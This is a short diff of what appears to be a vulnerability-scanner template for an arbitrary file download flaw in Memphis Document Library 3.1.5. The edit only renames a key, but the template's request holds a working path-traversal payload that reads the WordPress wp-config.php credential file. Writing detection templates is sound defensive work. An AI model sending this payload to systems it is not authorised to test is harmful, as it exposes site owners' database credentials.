@@ -8,7 +8,7 @@ info:
   description: arbitrary file download in Memphis Document Library 3.1.5
   reference: https://www.exploit-db.com/exploits/39593
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php'
